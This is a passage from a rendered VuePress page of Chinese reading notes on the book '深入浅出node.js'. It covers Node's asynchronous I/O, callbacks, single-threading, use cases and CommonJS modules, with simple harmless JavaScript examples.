<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>深入浅出node.js | 读书笔记</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/reading-notes/avatar.png">
    <meta name="description" content="小白龙的前端读书笔记">
    
    <link rel="preload" href="/reading-notes/assets/css/0.styles.9653101a.css" as="style"><link rel="preload" href="/reading-notes/assets/js/app.3c3209d0.js" as="script"><link rel="preload" href="/reading-notes/assets/js/2.a1b00631.js" as="script"><link rel="preload" href="/reading-notes/assets/js/11.7a9ed704.js" as="script"><link rel="prefetch" href="/reading-notes/assets/js/10.b01eb44d.js"><link rel="prefetch" href="/reading-notes/assets/js/12.326518b6.js"><link rel="prefetch" href="/reading-notes/assets/js/13.bb903b42.js"><link rel="prefetch" href="/reading-notes/assets/js/14.f8bb1bef.js"><link rel="prefetch" href="/reading-notes/assets/js/15.fc976780.js"><link rel="prefetch" href="/reading-notes/assets/js/16.985c71fb.js"><link rel="prefetch" href="/reading-notes/assets/js/17.91297be8.js"><link rel="prefetch" href="/reading-notes/assets/js/3.e746fc3a.js"><link rel="prefetch" href="/reading-notes/assets/js/4.bbac7c20.js"><link rel="prefetch" href="/reading-notes/assets/js/5.a9f838c3.js"><link rel="prefetch" href="/reading-notes/assets/js/6.514d7ebf.js"><link rel="prefetch" href="/reading-notes/assets/js/7.7c73e3c9.js"><link rel="prefetch" href="/reading-notes/assets/js/8.d947842c.js"><link rel="prefetch" href="/reading-notes/assets/js/9.6eecae53.js">
    <link rel="stylesheet" href="/reading-notes/assets/css/0.styles.9653101a.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/reading-notes/" class="home-link router-link-active"><img src="/reading-notes/avatar.png" alt="读书笔记" class="logo"> <span class="site-name can-hide">读书笔记</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="https://xblcity.github.io/blog" target="_blank" rel="noopener noreferrer" class="nav-link external">
  博客
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/xblcity/reading-notes" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="https://xblcity.github.io/blog" target="_blank" rel="noopener noreferrer" class="nav-link external">
  博客
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/xblcity/reading-notes" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/reading-notes/" aria-current="page" class="sidebar-link">总览</a></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>2019年</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/reading-notes/books19/professional-javascript.html" class="sidebar-link">Javascript高级程序设计(第三版)读书笔记</a></li><li><a href="/reading-notes/books19/understanding-es6.html" class="sidebar-link">深入理解ES6</a></li><li><a href="/reading-notes/books19/you-don't-know-js1.html" class="sidebar-link">你不知道的Javascript(上卷)</a></li><li><a href="/reading-notes/books19/understanding-node.html" aria-current="page" class="active sidebar-link">深入浅出node.js</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第一章-node简介" class="sidebar-link">第一章 Node简介</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_1-4-node的特点" class="sidebar-link">1.4 Node的特点</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_1-5-node的应用场景" class="sidebar-link">1.5 Node的应用场景</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_1-6-node的使用者" class="sidebar-link">1.6 Node的使用者</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_1-7-总结" class="sidebar-link">1.7 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第二章-模块机制" class="sidebar-link">第二章 模块机制</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-1-commonjs规范" class="sidebar-link">2.1 CommonJS规范</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-2-node的模块实现" class="sidebar-link">2.2 Node的模块实现</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-3-核心模块" class="sidebar-link">2.3 核心模块</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-4-c-c-扩展模块" class="sidebar-link">2.4 C/C++扩展模块</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-5-模块调用栈" class="sidebar-link">2.5 模块调用栈</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-6-包与npm" class="sidebar-link">2.6 包与NPM</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-7-前后端共用模块" class="sidebar-link">2.7 前后端共用模块</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_2-8-总结" class="sidebar-link">2.8 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第三章-异步i-o" class="sidebar-link">第三章 异步I/O</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_3-1-为什么要异步i-o" class="sidebar-link">3.1 为什么要异步I/O</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_3-2-异步i-o现状" class="sidebar-link">3.2 异步I/O现状</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_3-3-node的异步i-o" class="sidebar-link">3.3 Node的异步I/O</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_3-4-非i-o的异步api" class="sidebar-link">3.4 非I/O的异步API</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_3-5-事件驱动与高性能服务器" class="sidebar-link">3.5 事件驱动与高性能服务器</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第四章-异步编程" class="sidebar-link">第四章 异步编程</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_4-1-函数式编程" class="sidebar-link">4.1 函数式编程</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_4-2-异步编程的优势与缺点" class="sidebar-link">4.2 异步编程的优势与缺点</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_4-3-异步编程解决方案" class="sidebar-link">4.3 异步编程解决方案</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_4-4-异步并发控制" class="sidebar-link">4.4 异步并发控制</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_4-5-总结" class="sidebar-link">4.5 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第五章-内存控制" class="sidebar-link">第五章 内存控制</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-1-v8的垃圾回收机制和内存限制" class="sidebar-link">5.1 V8的垃圾回收机制和内存限制</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-2-高效使用内存" class="sidebar-link">5.2 高效使用内存</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-2-2-闭包" class="sidebar-link">5.2.2 闭包</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-3-内存指标" class="sidebar-link">5.3 内存指标</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-4-内存泄漏" class="sidebar-link">5.4 内存泄漏</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-5-内存泄漏排查" class="sidebar-link">5.5 内存泄漏排查</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-6-大内存应用" class="sidebar-link">5.6 大内存应用</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_5-7-总结" class="sidebar-link">5.7 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第六章-理解buffer" class="sidebar-link">第六章 理解Buffer</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_6-1-buffer结构" class="sidebar-link">6.1 Buffer结构</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_6-2-buffer的转换" class="sidebar-link">6.2 Buffer的转换</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_6-3-buffer的拼接" class="sidebar-link">6.3 Buffer的拼接</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_6-4-buffer与性能" class="sidebar-link">6.4 Buffer与性能</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_6-5-总结" class="sidebar-link">6.5 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第七章-网络编程" class="sidebar-link">第七章 网络编程</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-1-构建tcp服务" class="sidebar-link">7.1 构建TCP服务</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-2-构建udp服务" class="sidebar-link">7.2 构建UDP服务</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-3-构建http服务" class="sidebar-link">7.3 构建HTTP服务</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-4-构建websocket服务" class="sidebar-link">7.4 构建WebSocket服务</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-5-网络服务与安全" class="sidebar-link">7.5 网络服务与安全</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_7-6-总结" class="sidebar-link">7.6 总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第八章-构建web应用" class="sidebar-link">第八章 构建Web应用</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_8-1-基础功能" class="sidebar-link">8.1 基础功能</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_8-2-数据上传" class="sidebar-link">8.2 数据上传</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_8-3-路由解析" class="sidebar-link">8.3 路由解析</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_8-4-中间件" class="sidebar-link">8.4 中间件</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#_8-5-页面渲染" class="sidebar-link">8.5 页面渲染</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第九章-玩转进程" class="sidebar-link">第九章 玩转进程</a></li><li class="sidebar-sub-header"><a href="/reading-notes/books19/understanding-node.html#第十章-测试" class="sidebar-link">第十章 测试</a></li></ul></li></ul></li><li><a href="/reading-notes/books19/understanding-webpack.html" class="sidebar-link">深入浅出webpack</a></li><li><a href="/reading-notes/books19/react.html" class="sidebar-link">React Docs(英译中)</a></li><li><a href="/reading-notes/books19/vue.html" class="sidebar-link">vue2.x文档</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>2020年</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/reading-notes/books20/functional-javascript.html" class="sidebar-link">Javascript ES6 函数式编程入门经典</a></li><li><a href="/reading-notes/books20/react20.html" class="sidebar-link">React 文档总结思考</a></li><li><a href="/reading-notes/books20/node-in-action.html" class="sidebar-link">Node.js实战 第二版 2018</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="深入浅出node-js"><a href="#深入浅出node-js" class="header-anchor">#</a> 深入浅出node.js</h1> <blockquote><p>该书不仅讲解了node.js方面的知识，对于了解与巩固网络传输方面的知识也有很大帮助，对前端开发来说，太棒了~</p></blockquote> <ul><li><p><a href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-node%E7%AE%80%E4%BB%8B">第一章 Node简介</a></p></li> <li><p><a href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6">第二章 Node简介</a></p></li> <li><p><a href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E5%BC%82%E6%AD%A5i/o">第三章 异步I/O</a></p></li> <li><p><a href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B">第四章 异步编程</a></p></li> <li><p><a href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%86%85%E5%AD%98%E6%8E%A7%E5%88%B6">第五章 内存控制</a></p></li> <li><p><a href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E7%90%86%E8%A7%A3buffer">第六章 理解Buffer</a></p></li> <li><p><a href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B">第七章 网络编程</a></p></li> <li><p><a href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%BA%94%E7%94%A8">第八章 构建Web应用</a></p></li></ul> <p>😄 😃 😇</p> <h2 id="第一章-node简介"><a href="#第一章-node简介" class="header-anchor">#</a> 第一章 Node简介</h2> <h3 id="_1-4-node的特点"><a href="#_1-4-node的特点" class="header-anchor">#</a> 1.4 Node的特点</h3> <h4 id="_1-4-1-异步i-o"><a href="#_1-4-1-异步i-o" class="header-anchor">#</a> 1.4.1 异步I/O</h4> <p>I/O 即 Input/Output，即输入输出，异步I/O即即时Input不会立即得到Output<br>
比如发起ajax请求就是异步I/O</p> <div class="language-js extra-class"><pre class="language-js"><code>$<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/url'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到响应'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'发送ajax结束'</span><span class="token punctuation">)</span>
</code></pre></div><p>先输出的是<code>发送ajax结束</code>,然后输出的是<code>收到响应</code><br>
也就是说，调用<code>$.post()</code>之后，后续代码是立即执行的，但是'收到响应'的执行时间是不确定的，，异步调用中对于结果值的捕获是符合'Don't call me, I will call you'的原则的，这也是注重结果，不关心过程的一种表现。</p> <p>在Node中，异步I/O也很常见。以读取文件为例，我们可以看到它与前端ajax调用的方法是极其类似的。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>

fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/path'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'读取文件完成'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'发起读取文件结束'</span><span class="token punctuation">)</span>
</code></pre></div><p>同样，先输出的是'发起读取文件结束'，'读取文件完成'的执行也取决于文件的异步调用何时结束。</p> <p>在Node中，我们可以从语言层面很自然的进行并行I/O操作，每个调用之间无需等待之前的I/O调用结束。</p> <div class="language-js extra-class"><pre class="language-js"><code>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/path1'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'读取文件1完成'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/path2'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'读取文件2完成'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>对于同步I/O而言，它们的耗时是两个任务的耗时只和，而异步I/O读取文件的耗时取决于最慢的那个文件读取的耗时(异步I/O机制与实现见第三章)</p> <h4 id="_1-4-2-事件与回调函数"><a href="#_1-4-2-事件与回调函数" class="header-anchor">#</a> 1.4.2 事件与回调函数</h4> <p>Node创建一个Web服务器，并侦听8080端口，对于服务器，我们为其绑定了request事件，对于请求对象，我们为其绑定了data事件和end事件</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> querystring <span class="token operator">=</span> <span class="token function">requre</span><span class="token punctuation">(</span><span class="token string">'querystring'</span><span class="token punctuation">)</span>

<span class="token comment">// 侦听服务器的request事件</span>
http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> postData <span class="token operator">=</span> <span class="token string">''</span>
  req<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
  <span class="token comment">// 侦听请求的data事件</span>
  req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    postData <span class="token operator">+=</span> chunk
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token comment">// 镇定请求的end事件</span>
  req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>postData<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器启动完成'</span><span class="token punctuation">)</span>
</code></pre></div><p>相应的，我们在前端为ajax绑定了success事件，在发出请求后，只关心请求成功时执行相应的业务逻辑即可</p> <div class="language-js extra-class"><pre class="language-js"><code>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token string">'url'</span><span class="token operator">:</span> <span class="token string">'/url'</span><span class="token punctuation">,</span>
  <span class="token string">'method'</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
  <span class="token string">'data'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">'success'</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// success事件要处理的内容</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>从上面可以看出，回调函数无处不在，这是因为在js中，我们将函数作为一等公民来对待，可以将函数作为对象传递给方法作为实参进行调用</p> <p>Node除了异步和事件外，回调函数也是一大特色，回调函数也是最好的接受异步调用返回数据的方式</p> <h4 id="_1-4-3-单线程"><a href="#_1-4-3-单线程" class="header-anchor">#</a> 1.4.3 单线程</h4> <p>Node保持了js在浏览器中单线程的特点，而且在Node中，js与其他线程是无法共享任何状态的。单线程的最大好处是不用像多线程编程那样楚楚在意状态的同步问题，这里诶呦死锁的存在，也没有线程上下文交换所带来的性能上的开销。</p> <p>单线程的弱点具体有以下三点</p> <ul><li>无法利用多核CPU</li> <li>错误会引起整个应用退出，应用的健壮性值得考验</li> <li>大量计算占用CPU导致无法继续调用异步I/O</li></ul> <p>Node采用与Web Workers相同的思路来解决单线程中大计算量的问题: child_process</p> <h4 id="_1-4-4-跨平台"><a href="#_1-4-4-跨平台" class="header-anchor">#</a> 1.4.4 跨平台</h4> <p>Linux与Windows</p> <h3 id="_1-5-node的应用场景"><a href="#_1-5-node的应用场景" class="header-anchor">#</a> 1.5 Node的应用场景</h3> <p>关于Node，讨论较多的主要有I/O密集型和CPU密集型</p> <h4 id="_1-5-1-i-o密集型"><a href="#_1-5-1-i-o密集型" class="header-anchor">#</a> 1.5.1 I/O密集型</h4> <p>从单线程角度来说，Node处理I/O的能力是值得称赞的。Node面向网络且擅长并行I/O ?</p> <p>I/O密集的优势主要在于Node利用事件循环的 处理能力，而不是启动每一个线程为每一个请求服务，资源占用极少</p> <h4 id="_1-5-2-是否不擅长cpu密集型业务"><a href="#_1-5-2-是否不擅长cpu密集型业务" class="header-anchor">#</a> 1.5.2 是否不擅长CPU密集型业务</h4> <p>CPU密集型应用给Node带来的挑战主要是：由于js单线程的原因，如果有长时间运行的计算(比如大循环)，将会导致CPU时间片不能释放，使得后续I/O无法发起</p> <h3 id="_1-6-node的使用者"><a href="#_1-6-node的使用者" class="header-anchor">#</a> 1.6 Node的使用者</h3> <ul><li>前后端编程语言环境统一</li> <li>Node带来的高性能I/O用于实时应用</li> <li>并行I/O使得使用者可以更高效地利用分布式环境</li> <li>并行I/O，有效利用稳定接口提升web渲染能力</li> <li>云计算平台提供Node支持</li> <li>游戏开发领域</li> <li>工具类应用</li></ul> <h3 id="_1-7-总结"><a href="#_1-7-总结" class="header-anchor">#</a> 1.7 总结</h3> <p>Node的特点与优点，以及Node的使用场景</p> <h2 id="第二章-模块机制"><a href="#第二章-模块机制" class="header-anchor">#</a> 第二章 模块机制</h2> <p>js诞生之初，web1.0时代，js这种脚本语言主要有两个作用广为流传，一是表单校验，而是网页特效。web2.0时代，各种前端库和框架被开发出来，随后更多的应用需求在前端被实现，js也从表单校验跃迁到应用开发的级别上<br>
js不断被类剧和抽象，以更好地组织业务逻辑，从另一个角度而言，它也道出了js先天就缺乏的一项功能：模块。<br>
在其他高级语言中，Java有类文件，Python有import机制，Ruby有require，PHP有include和requrie，而js通过<code>&lt;script&gt;</code>标签引入代码的方式显得杂乱无章，语言自身毫无组织和约束能力。人们不得不用命名空间等方式人为地约束代码，以求达到安全和易用的目的</p> <h3 id="_2-1-commonjs规范"><a href="#_2-1-commonjs规范" class="header-anchor">#</a> 2.1 CommonJS规范</h3> <h4 id="_2-1-2-commonjs的模块规范"><a href="#_2-1-2-commonjs的模块规范" class="header-anchor">#</a> 2.1.2 CommonJS的模块规范</h4> <ul><li>模块引用 <code>var math = require('math')</code></li> <li>模块定义，使用<code>module.exports</code>导出当前模块的方法或变量</li> <li>模块标识，其实就是传递给<code>require()</code>方法的参数</li></ul> <h3 id="_2-2-node的模块实现"><a href="#_2-2-node的模块实现" class="header-anchor">#</a> 2.2 Node的模块实现</h3> <p>在Node中，模块分为两类，一类是Node提供的模块，称为核心模块。另一类是用户编写的模块，称为文件模块</p> <ul><li>核心模块在Node源代码编译过程中，编译进了二进制执行文件，在node进程启动时，部分核心模块就直接加载进内存中，所以这部分核心引入时，文件定位和编译执行这两个步骤可以胜却迪奥，并且在路径分析中优先判断，所以它们加载速度是最快的</li> <li>文件模块则是在运行时动态加载，需要完整的路径分析，文件定位，编译执行过程，速度比核心模块慢</li></ul> <h4 id="_2-2-1-优先从缓存加载"><a href="#_2-2-1-优先从缓存加载" class="header-anchor">#</a> 2.2.1 优先从缓存加载</h4> <h4 id="_2-2-2-路径分析和文件定位"><a href="#_2-2-2-路径分析和文件定位" class="header-anchor">#</a> 2.2.2 路径分析和文件定位</h4> <h5 id="_1-模块标识符分析"><a href="#_1-模块标识符分析" class="header-anchor">#</a> 1.模块标识符分析</h5> <p>require()方法接收一个标识符作为参数，模块标识符在Node中主要分为以下几类:</p> <ul><li>核心模块，如http,fs,path等</li> <li>.或..开始的相对路径文件模块</li> <li>以/开始的绝对路径文件模块</li> <li>非路径形式的文件模块，如自定义的connect模块</li></ul> <h5 id="_2-文件定位"><a href="#_2-文件定位" class="header-anchor">#</a> 2.文件定位</h5> <p>require()在分析标识符的过程中，会出现标识符中不包含文件拓展名的情况，这种情况下，Node会按.js, .json, .node的次序补扩展名</p> <h4 id="_2-2-3-模块编译"><a href="#_2-2-3-模块编译" class="header-anchor">#</a> 2.2.3 模块编译</h4> <p>在Node中，每个文件模块都是一个对象<br>
